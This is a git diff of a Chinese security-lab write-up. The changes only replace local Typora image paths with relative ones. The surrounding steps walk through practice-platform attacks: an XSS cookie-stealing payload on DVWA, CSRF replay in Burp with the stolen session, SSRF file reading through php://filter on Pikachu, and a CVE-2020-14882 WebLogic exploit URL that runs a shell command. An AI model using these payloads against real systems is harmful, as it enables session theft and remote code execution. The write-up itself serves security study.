@@ -5,15 +5,15 @@
 1. 使用pablo(密码letmein)用户登录，DVWA Security - High
 2. 通过XSS(Reflected)模块(输入`<img src=x OnerrOr=alert(document.cookie)>`)获取pablo用户的cookie信息
 
-![xss-get-cookie](/Users/minwang/Documents/typora_images/xss-get-cookie.png)
+![xss-get-cookie](images/xss-get-cookie.png)
 
 3. 切换到CSRF模块，打开burp进行抓包，在CSRF模块提交新密码
 
-![csrf-burp](../../../Documents/typora_images/csrf-burp.png)
+![csrf-burp](images/csrf-burp.png)
 
 4. Cookie段，改成之前xss抓到的cookie值，security改成low，`PHPSESSID=bo5gn68611g61khqn7as1eakqc; security=low`，GET url段的&user_token删除后放行抓到的数据包。显示pablo密码修改成功。用新密码123456登录测试成功。
 
-![password-changed](../../../Documents/typora_images/password-changed.png)
+![password-changed](images/password-changed.png)
 
 
 
@@ -21,21 +21,21 @@
 
 1. 使用kobe用户登录
 
-![csrf-post-kobe](../../../Documents/typora_images/csrf-post-kobe-8559158.png)
+![csrf-post-kobe](images/csrf-post-kobe-8559158.png)
 
 2. 修改个人信息，打开burp进行包抓取
 
-![csrf-post-kobe-modify](../../../Documents/typora_images/csrf-post-kobe-modify.png)
+![csrf-post-kobe-modify](images/csrf-post-kobe-modify.png)
 
 3. 使用burp的CRSF POC generator
 
-![csrf-poc-1](../../../Documents/typora_images/csrf-poc-1.png)
+![csrf-poc-1](images/csrf-poc-1.png)
 
-![csrf-poc-2](../../../Documents/typora_images/csrf-poc-2.png)
+![csrf-poc-2](images/csrf-poc-2.png)
 
 4. 生成的csrf html 替换抓到的数据包最后一段后放行。
 
-![csrf-poc-3](../../../Documents/typora_images/csrf-poc-3.png)
+![csrf-poc-3](images/csrf-poc-3.png)
 
 
 
@@ -43,7 +43,7 @@
 
 1. 在pikatu平台，SSRF(file_get_content)模块，
 
-![ssrf-file-get-content](../../../Documents/typora_images/ssrf-file-get-content.png)
+![ssrf-file-get-content](images/ssrf-file-get-content.png)
 
 
 
@@ -53,7 +53,7 @@
 http://192.168.216.129:8082/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/resource=ssrf.php
 ```
 
-![ssrf-file-get-content-1](../../../Documents/typora_images/ssrf-file-get-content-1.png)
+![ssrf-file-get-content-1](images/ssrf-file-get-content-1.png)
 
 
 
@@ -63,9 +63,9 @@ http://192.168.216.129:8082/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/reso
 http://192.168.216.129:8082/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php
 ```
 
-![ssrf-file-get-content-2](../../../Documents/typora_images/ssrf-file-get-content-2-8563928.png)
+![ssrf-file-get-content-2](images/ssrf-file-get-content-2-8563928.png)
 
-![ssrf-file-get-content-3](../../../Documents/typora_images/ssrf-file-get-content-3.png)
+![ssrf-file-get-content-3](images/ssrf-file-get-content-3.png)
 
 
 
@@ -121,7 +121,7 @@ Status: Downloaded newer image for vulhub/weblogic:12.2.1.3-2018
 Creating cve-2020-14882_weblogic_1 ... done
 ```
 
-![weblogic-console](../../../Documents/typora_images/weblogic-console.png)
+![weblogic-console](images/weblogic-console.png)
 
 2. 利用CVE-2020-14882漏洞，访问以下URL，即可未授权访问到管理后台页面：
 
@@ -131,10 +131,10 @@ Creating cve-2020-14882_weblogic_1 ... done
 
 `注：%252e%252e%252f 是经过两次URL编码后的../，通过这个就可以实现穿越路径未授权访问后台页面`
 
-![weblogic-console-portal](../../../Documents/typora_images/weblogic-console-portal.png)
+![weblogic-console-portal](images/weblogic-console-portal.png)
 
 ```url
 http://39.104.26.211:7001/console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java .lang.Runtime.getRuntime().exec('touch%20/tmp/geektime2');")
 ```
 
-![weblogic-add-file](../../../Documents/typora_images/weblogic-add-file.png)
+![weblogic-add-file](images/weblogic-add-file.png)
